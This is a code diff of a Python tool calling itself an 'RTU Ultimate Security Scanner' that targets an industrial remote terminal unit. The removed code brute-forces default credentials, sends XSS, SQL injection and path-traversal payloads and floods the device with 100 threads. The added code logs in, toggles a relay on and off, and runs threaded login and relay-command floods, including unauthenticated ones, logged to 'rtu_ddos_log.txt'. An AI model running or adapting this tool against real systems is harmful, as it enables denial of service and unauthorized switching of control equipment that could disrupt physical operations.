@@ -1,242 +1,28 @@
-#!/usr/bin/env python3
-"""
-$$$$$$$\ $$$$$$$$\ $$\   $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
-$$  __$$\\__$$  __|$$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |$$$\  $$ |$$  _____|$$  __$$\ 
-$$ |  $$ |  $$ |   $$ |  $$ |      $$ /  \__|$$ /  \__|$$ /  $$ |$$$$\ $$ |$$$$\ $$ |$$ |      $$ |  $$ |
-$$$$$$$  |  $$ |   $$ |  $$ |      \$$$$$$\  $$ |      $$$$$$$$ |$$ $$\$$ |$$ $$\$$ |$$$$$\    $$$$$$$  |
-$$  __$$<   $$ |   $$ |  $$ |       \____$$\ $$ |      $$  __$$ |$$ \$$$$ |$$ \$$$$ |$$  __|   $$  __$$< 
-$$ |  $$ |  $$ |   $$ |  $$ |      $$\   $$ |$$ |  $$\ $$ |  $$ |$$ |\$$$ |$$ |\$$$ |$$ |      $$ |  $$ |
-$$ |  $$ |  $$ |   \$$$$$$  |      \$$$$$$  |\$$$$$$  |$$ |  $$ |$$ | \$$ |$$ | \$$ |$$$$$$$$\ $$ |  $$ |
-\__|  \__|  \__|    \______/        \______/  \______/ \__|  \__|\__|  \__|\__|  \__|\________|\__|  \__|
-                                                    a                                                     
-RTU Ultimate Security Scanner - Aggressive Mode (Fixed)
-"""
-
 import requests
-import concurrent.futures
 import threading
 import time
-import random
-from fpdf import FPDF
 from datetime import datetime
-from bs4 import BeautifulSoup
 
-# Configuration
-RTU_IP = "192.168.11.200"
-RTU_ENDPOINTS = ["/login.html?t=44690", "/index.html?t=1748012674629", "/config", "/system", "/api"]
-CREDENTIALS = [("admin", "admin"), ("root", "toor"), ("user", "123456")]
-THREADS = 100  # Aggressive threading
-TIMEOUT = 3
-STRESS_DURATION = 60  # Exactly 60 seconds, no more
-REPORT_FILE = f"RTU_Audit_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
+# Constants - change these for your target server
+BASE_URL = "http://example.com"  # Change to your server
+LOGIN_URL = f"{BASE_URL}/login"
+WORK_URL = f"{BASE_URL}/rtu/work"
+USERNAME = "admin"   # Change to valid username
+PASSWORD = "admin"   # Change to valid password
 
-class RTUScanner:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.headers = {
-            "User-Agent": "RTU-Killer-Scanner/1.0",
-            "Accept": "*/*"
-        }
-        self.findings = []
-        self.pdf = FPDF()
-        self.start_time = datetime.now()
-        self.stop_event = threading.Event()
-        self.stress_stats = {"requests": 0, "errors": 0}
+# Logging setup
+LOG_FILE = "rtu_ddos_log.txt"
 
-    def add_finding(self, severity, title, description, proof=None):
-        self.findings.append({
-            "severity": severity,
-            "title": title,
-            "description": description,
-            "proof": proof,
-            "timestamp": datetime.now().strftime("%H:%M:%S")
-        })
-        print(f"[{severity}] {title}")
+def log(msg):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    line = f"[{timestamp}] {msg}"
+    print(line)
+    with open(LOG_FILE, "a") as f:
+        f.write(line + "\n")
 
-    def scan_endpoints(self):
-        """Aggressive parallel scanning"""
-        print("\n[!] Launching Aggressive Endpoint Scan")
-        
-        def check_endpoint(endpoint):
-            url = f"http://{RTU_IP}{endpoint}"
-            try:
-                r = self.session.get(url, timeout=TIMEOUT)
-                
-                if r.status_code == 200:
-                    if "password" in r.text.lower():
-                        self.add_finding(
-                            "CRITICAL", 
-                            "Password Exposure", 
-                            f"Found credentials at {url}",
-                            r.text[:200] + "..."
-                        )
-                    
-                    # Vulnerability checks
-                    vuln_checks = {
-                        "XSS": "<script>alert(1)</script>",
-                        "SQLi": "' OR 1=1--",
-                        "LFI": "../../../../etc/passwd"
-                    }
-                    
-                    for vuln, payload in vuln_checks.items():
-                        test_url = f"{url}?test={payload}"
-                        try:
-                            r_test = self.session.get(test_url, timeout=TIMEOUT)
-                            if payload in r_test.text:
-                                self.add_finding(
-                                    "CRITICAL",
-                                    f"Possible {vuln} Vulnerability",
-                                    f"Payload reflected at {test_url}"
-                                )
-                        except:
-                            pass
-                
-                if "login" in endpoint.lower():
-                    self.bruteforce_login(url)
-                    
-            except Exception as e:
-                self.add_finding(
-                    "ERROR",
-                    "Scan Error",
-                    f"Failed to scan {url}: {str(e)}"
-                )
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
-            executor.map(check_endpoint, RTU_ENDPOINTS)
-
-    def bruteforce_login(self, url):
-        """Aggressive credential testing"""
-        print(f"[!] Bruteforcing {url}")
-        
-        def try_login(cred):
-            try:
-                r = self.session.post(
-                    url,
-                    data={"username": cred[0], "password": cred[1]},
-                    timeout=TIMEOUT
-                )
-                if "invalid" not in r.text.lower():
-                    self.add_finding(
-                        "CRITICAL",
-                        "Successful Login",
-                        f"Credentials worked: {cred[0]}/{cred[1]} at {url}",
-                        r.text[:200] + "..."
-                    )
-            except:
-                pass
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
-            executor.map(try_login, CREDENTIALS)
-
-    def stress_test(self):
-        """Fixed stress test with guaranteed termination"""
-        print(f"\n[!] Starting Killer Stress Test ({STRESS_DURATION}s)")
-        self.stop_event.clear()
-        self.stress_stats = {"requests": 0, "errors": 0}
-        
-        def attack():
-            while not self.stop_event.is_set():
-                try:
-                    target = f"http://{RTU_IP}{random.choice(RTU_ENDPOINTS)}"
-                    self.session.get(target, timeout=1)
-                    self.stress_stats["requests"] += 1
-                except:
-                    self.stress_stats["errors"] += 1
-
-        # Start threads
-        threads = []
-        for _ in range(THREADS):
-            t = threading.Thread(target=attack)
-            t.daemon = True  # Ensures threads die with main program
-            t.start()
-            threads.append(t)
-
-        # Progress display
-        start_time = time.time()
-        while time.time() - start_time < STRESS_DURATION:
-            elapsed = int(time.time() - start_time)
-            print(
-                f"\r[Stress Test] {elapsed}/{STRESS_DURATION}s | "
-                f"Requests: {self.stress_stats['requests']} | "
-                f"Errors: {self.stress_stats['errors']}",
-                end="", flush=True
-            )
-            time.sleep(1)
-        
-        # Cleanup
-        self.stop_event.set()
-        for t in threads:
-            t.join(timeout=1)  # Wait max 1 second per thread
-        
-        print()  # New line after progress
-        self.add_finding(
-            "WARNING",
-            "Stress Test Results",
-            f"{self.stress_stats['requests']} requests ({self.stress_stats['requests']/STRESS_DURATION:.1f}/sec) with {self.stress_stats['errors']} errors"
-        )
-
-    def generate_pdf(self):
-        """Generate professional PDF report"""
-        self.pdf = FPDF()
-        self.pdf.add_page()
-        
-        # Header
-        self.pdf.set_font('Arial', 'B', 16)
-        self.pdf.cell(0, 10, 'RTU Security Audit Report', 0, 1, 'C')
-        self.pdf.ln(10)
-        
-        # Metadata
-        self.pdf.set_font('Arial', '', 12)
-        self.pdf.cell(0, 10, f'Target: {RTU_IP}', 0, 1)
-        self.pdf.cell(0, 10, f'Date: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}', 0, 1)
-        self.pdf.cell(0, 10, f'Duration: {(datetime.now() - self.start_time).total_seconds():.1f} seconds', 0, 1)
-        self.pdf.ln(15)
-        
-        # Summary
-        self.pdf.set_font('Arial', 'B', 14)
-        self.pdf.cell(0, 10, 'Executive Summary', 0, 1)
-        self.pdf.set_font('Arial', '', 12)
-        
-        crit_count = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
-        warn_count = sum(1 for f in self.findings if f["severity"] == "WARNING")
-        
-        self.pdf.multi_cell(0, 10, 
-            f"This aggressive security audit identified {len(self.findings)} issues:\n"
-            f"- Critical: {crit_count}\n"
-            f"- Warnings: {warn_count}\n\n"
-            "See detailed findings below.")
-        self.pdf.ln(10)
-        
-        # Findings
-        self.pdf.set_font('Arial', 'B', 14)
-        self.pdf.cell(0, 10, 'Detailed Findings', 0, 1)
-        
-        for finding in sorted(self.findings, key=lambda x: x["severity"], reverse=True):
-            self.pdf.set_font('Arial', 'B', 12)
-            self.pdf.set_fill_color(255, 200, 200 if finding["severity"] == "CRITICAL" else 255)
-            self.pdf.cell(0, 10, 
-                f"{finding['severity']} - {finding['title']} ({finding['timestamp']})", 
-                0, 1, 'L', True)
-            
-            self.pdf.set_font('Arial', '', 10)
-            self.pdf.multi_cell(0, 8, finding["description"])
-            
-            if finding.get("proof"):
-                self.pdf.set_font('Arial', 'I', 8)
-                self.pdf.multi_cell(0, 6, f"Proof: {finding['proof']}")
-            
-            self.pdf.ln(5)
-        
-        # Footer
-        self.pdf.set_y(-15)
-        self.pdf.set_font('Arial', 'I', 8)
-        self.pdf.cell(0, 10, f'Generated by RTU Killer Scanner at {datetime.now().strftime("%H:%M:%S")}', 0, 0, 'C')
-        
-        self.pdf.output(REPORT_FILE)
-        print(f"\n[+] PDF report generated: {REPORT_FILE}")
-
-if __name__ == "__main__":
-    print("""
+# --- Banner ---
+def print_banner():
+    banner = r"""
 $$$$$$$\ $$$$$$$$\ $$\   $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
 $$  __$$\\__$$  __|$$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |$$$\  $$ |$$  _____|$$  __$$\ 
 $$ |  $$ |  $$ |   $$ |  $$ |      $$ /  \__|$$ /  \__|$$ /  $$ |$$$$\ $$ |$$$$\ $$ |$$ |      $$ |  $$ |
@@ -246,22 +32,126 @@ $$ |  $$ |  $$ |   $$ |  $$ |      $$\   $$ |$$ |  $$\ $$ |  $$ |$$ |\$$$ |$$ |\
 $$ |  $$ |  $$ |   \$$$$$$  |      \$$$$$$  |\$$$$$$  |$$ |  $$ |$$ | \$$ |$$ | \$$ |$$$$$$$$\ $$ |  $$ |
 \__|  \__|  \__|    \______/        \______/  \______/ \__|  \__|\__|  \__|\__|  \__|\________|\__|  \__|
                                                     a                                                     
-                                                                                                         
-                                                                                                        
 RTU Ultimate Security Scanner - Aggressive Mode (Fixed)
-""")
-    
-    scanner = RTUScanner()
-    
+"""
+    print(banner)
+    with open(LOG_FILE, "a") as f:
+        f.write(banner + "\n")
+
+# --- Login function ---
+def login(session, username, password):
     try:
-        scanner.scan_endpoints()
-        scanner.stress_test()  # Now properly timed
-        
-    except KeyboardInterrupt:
-        print("\n[!] Scan interrupted by user")
-        scanner.stop_event.set()  # Ensure stress test stops
+        resp = session.post(LOGIN_URL, json={"username": username, "password": password}, timeout=5)
+        if resp.status_code == 200:
+            log(f"Login SUCCESS for user '{username}'.")
+            return True, resp.text
+        else:
+            log(f"Login FAILED for user '{username}'. Status: {resp.status_code}, Response: {resp.text}")
+            return False, resp.text
+    except Exception as e:
+        log(f"Login EXCEPTION: {str(e)}")
+        return False, str(e)
+
+# --- Unauthorized RTU access test ---
+def unauthorized_access_test():
+    session = requests.Session()
+    try:
+        resp = session.post(WORK_URL, json={"id": "relay1", "status": "on"}, headers={"Content-Type": "application/json"}, timeout=5)
+        log(f"Unauthorized RTU access attempt: Status {resp.status_code}, Response: {resp.text}")
+        return resp.status_code, resp.text
+    except Exception as e:
+        log(f"Unauthorized RTU access EXCEPTION: {str(e)}")
+        return None, str(e)
+
+# --- Authorized RTU command test ---
+def rtu_command_test(session):
+    try:
+        resp_on = session.post(WORK_URL, json={"id": "relay1", "status": "on"}, headers={"Content-Type": "application/json"}, timeout=5)
+        log(f"RTU Command 'Turn ON': Status {resp_on.status_code}, Response: {resp_on.text}")
+    except Exception as e:
+        log(f"RTU Command 'Turn ON' EXCEPTION: {str(e)}")
+
+    try:
+        resp_off = session.post(WORK_URL, json={"id": "relay1", "status": "off"}, headers={"Content-Type": "application/json"}, timeout=5)
+        log(f"RTU Command 'Turn OFF': Status {resp_off.status_code}, Response: {resp_off.text}")
+    except Exception as e:
+        log(f"RTU Command 'Turn OFF' EXCEPTION: {str(e)}")
+
+# --- Aggressive login flooder ---
+def login_flood_worker(thread_id, count):
+    session = requests.Session()
+    for i in range(count):
+        try:
+            resp = session.post(LOGIN_URL, json={"username": USERNAME, "password": PASSWORD}, timeout=5)
+            if resp.status_code == 200:
+                log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: SUCCESS")
+            else:
+                log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: FAIL - Status {resp.status_code}")
+        except Exception as e:
+            log(f"[Login Flood Thread {thread_id}] Attempt {i+1}: EXCEPTION - {str(e)}")
+
+def start_login_flood(threads=10, attempts_per_thread=50):
+    log("Starting aggressive login flood...")
+    thread_list = []
+    for i in range(threads):
+        t = threading.Thread(target=login_flood_worker, args=(i+1, attempts_per_thread))
+        t.start()
+        thread_list.append(t)
+    for t in thread_list:
+        t.join()
+    log("Login flood finished.")
+
+# --- Aggressive RTU command flooder ---
+def rtu_flood_worker(thread_id, count, session=None):
+    # If no authorized session, use a fresh session (unauthorized)
+    if session is None:
+        session = requests.Session()
+    for i in range(count):
+        try:
+            # Randomly toggle relay status
+            status = "on" if i % 2 == 0 else "off"
+            resp = session.post(WORK_URL, json={"id": "relay1", "status": status}, headers={"Content-Type": "application/json"}, timeout=5)
+            log(f"[RTU Flood Thread {thread_id}] Attempt {i+1}: Status {resp.status_code}")
+        except Exception as e:
+            log(f"[RTU Flood Thread {thread_id}] Attempt {i+1}: EXCEPTION - {str(e)}")
+
+def start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=None):
+    log("Starting aggressive RTU command flood...")
+    thread_list = []
+    for i in range(threads):
+        # Pass the authorized session if available, else None
+        t = threading.Thread(target=rtu_flood_worker, args=(i+1, attempts_per_thread, authorized_session))
+        t.start()
+        thread_list.append(t)
+    for t in thread_list:
+        t.join()
+    log("RTU command flood finished.")
+
+# --- Main function ---
+def main():
+    print_banner()
     
-    finally:
-        scanner.generate_pdf()
-        print("\n[!] WARNING: This scan may have disrupted the RTU operation")
-        print("[!] Review the findings and secure your system immediately")
+    # Step 1: Unauthorized RTU access test
+    log("Performing unauthorized RTU access test...")
+    unauthorized_access_test()
+
+    # Step 2: Login once and test authorized RTU commands
+    session = requests.Session()
+    success, msg = login(session, USERNAME, PASSWORD)
+    if not success:
+        log("Login failed. Skipping authorized RTU commands and RTU flood.")
+    else:
+        log("Performing authorized RTU command test...")
+        rtu_command_test(session)
+
+    # Step 3: Start aggressive flooding
+    start_login_flood(threads=10, attempts_per_thread=50)
+    
+    if success:
+        start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=session)
+    else:
+        # Flood RTU commands unauthorized if login failed
+        start_rtu_flood(threads=10, attempts_per_thread=50, authorized_session=None)
+
+if __name__ == "__main__":
+    main()
